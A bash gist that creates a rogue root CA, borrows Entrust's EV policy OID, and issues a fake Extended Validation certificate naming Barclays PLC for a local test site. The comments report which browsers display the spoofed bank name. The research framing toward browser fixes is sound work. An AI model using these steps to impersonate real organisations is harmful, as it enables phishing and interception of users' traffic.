#date: 2021-09-01T13:22:19Z
#url: https://api.github.com/gists/22f7dffeeee7db816ef4236852e02cd8
#owner: https://api.github.com/users/xitedemon

#!/bin/bash

# The following steps, which were tested on Ubuntu 18.04 LTS and on the Ubuntu-powered Linux for Windows Subsystem on Windows,
# will:
#
# * Compile a recent version of OpenSSL (you can skip this step and use your package maintainer's version if you prefer, but you
#                                        might have to tweak a few bits)
# * Create a separate set of configuration files suitable for configuring a basic CA capable of signing EV certificates
# * Create such a CA (hackerca.local / HackerCA EV Root CA)
# * Create a certificate request for a site, hackersite.local, belonging to company "Barclays PLC [GB]"
# * Create that certificate, signing it as the CA and attaching the additional data required of an EV certificate belonging
#   to that company
#
# To replicate my experiment, all that remains for you to do is:
# * Install ca.crt (the CA's root certificate) into your operating system or browser's certificate store (and mark it as trusted,
#   if necessary). Also: add the CA's OID (I'm using 2.16.840.1.114028.10.1.2) to the expected OIDs (in Windows, this can be found
#   in Certificate Manager by right-clicking the certificate, clicking Properties, then the Extended Validation tab; compare to
#   a known EV-capable CA's record if you need a clue)
#   This represents a step that can be automated by a network administrator on a corporate network
# * Update your hosts file with e.g. "127.0.0.1 hackersite.local" so that requests come to your site
# * Either set up a webserver using SSL key website.key and certiciate website.crt or else just use OpenSSL's "s_server" and
#   "-www" switches (as described at the very bottom) to set up a very basic server
# * Visit https://hackersite.local/ in your web browser
#
# My results -
# * Internet Explorer 11 and Edge 17 show the full company name - they fall for the spoofing
# * Firefox, Chrome, Opera, and Safari (both MacOS and iOS) all refrain from showing the company name in this instance (although
#   they still allow the connection - we REALLY need some kind of 'require-ev' flag; more ideas on that in a future post!); note
#   that this is true even where the browser shares Windows' certificate store!

# Install OpenSSL (I'm using 1.1.1pre9)
wget https://www.openssl.org/source/openssl-1.1.1-pre9.tar.gz
tar xzf openssl-1.1.1-pre9.tar.gz
rm openssl-1.1.1-pre9.tar.gz
cd openssl-1.1.1-pre9
./config --prefix=/usr/local --openssldir=/usr/local -Wl,--enable-new-dtags,-rpath,'$(LIBRPATH)'
make
make test
sudo make install
openssl version # should report e.g. "OpenSSL 1.1.1-pre9 (beta) 21 Aug 2018"
rm -rf openssl-1.1.1-pre9

# Generate CA private key (will ask for password)
openssl genrsa -aes256 -out ca.key 4096

# Make a copy of openssl configuration and add our own optional sections with CA extensions
# Note - 2.16.840.1.114028.10.1.2 is Entrust EV CPS, we're "borrowing" their OID (https://en.wikipedia.org/wiki/Extended_Validation_Certificate#Extended_Validation_certificate_identification)
#        2.23.140.1.1             is the Extended Validation Guidelines (https://cabforum.org/object-registry/#Object-Registry-of-the-CA-Browser-Forum)
cp /usr/local/openssl.cnf openssl.cnf
printf "
[danq_ca_ext]
subjectKeyIdentifier=hash
authorityKeyIdentifier=keyid:always,issuer
basicConstraints=critical,CA:true
keyUsage=critical,digitalSignature,cRLSign,keyCertSign

[new_oids]
trustList=2.16.840.1.113730.1.900
# these four are already defined in my OpenSSL, but they're here for if you're using an older version:
#businessCategory=2.5.4.15
#jurisdictionOfIncorporationLocalityName=1.3.6.1.4.1.311.60.2.1.1
#jurisdictionOfIncorporationStateOrProvinceName=1.3.6.1.4.1.311.60.2.1.2
#jurisdictionOfIncorporationCountryName=1.3.6.1.4.1.311.60.2.1.3
" >> openssl.cnf

# Create a configuration file with EV certificate extensions
printf "
[danq_website_ext]
#trustList=ASN1:UTF8String:https://mytestdomain.local/EVTrustList.etl
subjectKeyIdentifier=hash
authorityKeyIdentifier=keyid:always,issuer
keyUsage=critical,digitalSignature,keyEncipherment
extendedKeyUsage=serverAuth,clientAuth
authorityInfoAccess=OCSP;URI:http://ocsp.hackerca.local/
authorityInfoAccess=caIssuers;URI:http://hackerca.local/ca.html
crlDistributionPoints=URI:http://ocsp.hackerca.local/ca.crl
basicConstraints=critical,CA:false
certificatePolicies=@entrust,2.23.140.1.1
subjectAltName=DNS:hackersite.local

[entrust]
policyIdentifier=2.16.840.1.114028.10.1.2
CPS.1=http://hackerca.local/rpa
" > extensions.cnf

# Make serial number incrementer file, must have even number of digits
printf "012345" > ca.srl

# Generate CA root certificate signed with the CA key
OPENSSL_CONF=openssl.cnf openssl req -new -x509 -key ca.key -out ca.crt -days 3650 -set_serial 0 -subj "/C=GB/O=HackerCA/OU=hackerca.local/CN=HackerCA EV Root CA" -extensions danq_ca_ext

# Generate website key (as this is only an experimental key, a 30-day duration is plenty sufficient
# We'll be generating a certificate that spoofs Barclays PLC, a major UK bank - there's nothing special about them; just a random pick
openssl req -new -keyout website.key -out website.csr -days 30 -subj "/C=GB/ST=London/L=London/jurisdictionC=GB/O=Barclays PLC/businessCategory=Private Organization/OU=Web and Infrastructure Services/CN=hackersite.local"
openssl rsa -in website.key -out website.key

# Sign the website's CSR and provide a certificate with all the relevant EV extensions
OPENSSL_CONF=openssl.cnf openssl x509 -req -in website.csr -out website.crt -CAkey ca.key -CA ca.crt -days 30 -trustout -addtrust clientAuth -addtrust serverAuth -extfile extensions.cnf -extensions danq_website_ext

# Launch openssl webserver (on port 443, hence sudo)
sudo openssl s_server -accept 443 -cert website.crt -key website.key -www
